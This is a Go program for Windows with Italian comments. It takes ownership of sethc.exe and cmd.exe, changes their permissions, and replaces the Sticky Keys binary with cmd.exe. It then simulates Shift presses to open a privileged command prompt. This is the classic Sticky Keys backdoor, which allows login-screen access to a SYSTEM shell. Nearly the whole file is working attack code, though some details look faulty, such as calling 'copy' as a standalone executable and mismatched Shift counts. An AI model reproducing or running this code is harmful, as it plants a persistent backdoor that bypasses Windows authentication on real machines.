package main

import (
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"
	"unsafe"
)

// Costanti per le API di Windows
var (
	moduser32 = syscall.NewLazyDLL("user32.dll")

	procKeybdEvent = moduser32.NewProc("keybd_event")
)

// keyboard wrapper
func keybdEvent(bVk byte, bScan byte, dwFlags uint32, dwExtraInfo uintptr) {
	procKeybdEvent.Call(
		uintptr(bVk),
		uintptr(bScan),
		uintptr(dwFlags),
		dwExtraInfo,
	)
}

func main() {
	// Controlla se l'utente è admin
	if !isAdmin() {
		fmt.Println("Errore: Questo programma deve essere eseguito come amministratore.")
		os.Exit(1)
	}

	// Dichiarazione Dir
	sethcPath := `C:\Windows\System32\sethc.exe`
	cmdPath := `C:\Windows\System32\cmd.exe`
	sethcBak := `C:\Windows\System32\sethc.BAK`
	cmdBak := `C:\Windows\System32\cmd.BAK`
	sethcExeBak := `C:\Windows\System32\sethcexe.BAK`

	// Salva i permessi di sethc.exe
	fmt.Println("Salvataggio permessi sethc.exe...")
	if err := exec.Command("icacls", sethcPath, "/save", sethcBak, "/T").Run(); err != nil {
		fmt.Printf("Errore: %v\n", err)
		os.Exit(1)
	}

	// Prendi il possesso di sethc.exe
	fmt.Println("Presa del possesso di sethc.exe...")
	if err := exec.Command("takeown", "/f", sethcPath).Run(); err != nil {
		fmt.Printf("Errore: %v\n", err)
		os.Exit(1)
	}

	// Concedi permessi completi agli amministratori su sethc.exe
	fmt.Println("Concessione permessi amministratori su sethc.exe...")
	if err := exec.Command("icacls", sethcPath, "/grant", "administrators:F").Run(); err != nil {
		fmt.Printf("Errore: %v\n", err)
		os.Exit(1)
	}

	// Salva i permessi di cmd.exe
	fmt.Println("Salvataggio permessi cmd.exe...")
	if err := exec.Command("icacls", cmdPath, "/save", cmdBak, "/T").Run(); err != nil {
		fmt.Printf("Errore: %v\n", err)
		os.Exit(1)
	}

	// Prendi il possesso di cmd.exe
	fmt.Println("Presa del possesso di cmd.exe...")
	if err := exec.Command("takeown", "/f", cmdPath).Run(); err != nil {
		fmt.Printf("Errore: %v\n", err)
		os.Exit(1)
	}

	// Concedi permessi completi agli amministratori su cmd.exe
	fmt.Println("Concessione permessi amministratori su cmd.exe...")
	if err := exec.Command("icacls", cmdPath, "/grant", "administrators:F").Run(); err != nil {
		fmt.Printf("Errore: %v\n", err)
		os.Exit(1)
	}

	// Copia sethc.exe in sethcexe.BAK
	fmt.Println("Copia di sethc.exe in sethcexe.BAK...")
	if _, err := exec.Command("copy", sethcPath, sethcExeBak).Output(); err != nil {
		fmt.Printf("Errore: %v\n", err)
		os.Exit(1)
	}

	// Copia cmd.exe in sethc.exe
	fmt.Println("Copia di cmd.exe in sethc.exe...")
	if _, err := exec.Command("copy", cmdPath, sethcPath).Output(); err != nil {
		fmt.Printf("Errore: %v\n", err)
		os.Exit(1)
	}

	// Triggera Sticky Keys (Shift 10 volte)
	fmt.Println("Triggering Sticky Keys (Shift 5 volte)...")
	for i := 0; i < 10; i++ {
		// Shift down (0x10 = VK_SHIFT)
		keybdEvent(0x10, 0, 0, 0)
		// Shift up
		keybdEvent(0x10, 0, 0x0002, 0)
		time.Sleep(100 * time.Millisecond)
	}

	fmt.Println("Operazioni completate. cmd.exe amministratore.")
}

// isAdmin verifica se il processo ha privilegi di amministratore
func isAdmin() bool {
	var token syscall.Token
	if err := syscall.OpenProcessToken(syscall.GetCurrentProcess(), syscall.TOKEN_QUERY, &token); err != nil {
		return false
	}
	defer token.Close()

	var elevation syscall.TokenElevation
	var elevationSize uint32
	if err := syscall.GetTokenInformation(token.Handle(), syscall.TokenElevation, (*byte)(unsafe.Pointer(&elevation)), uint32(unsafe.Sizeof(elevation)), &elevationSize); err != nil {
		return false
	}

	return elevation.TokenIsElevated != 0
}
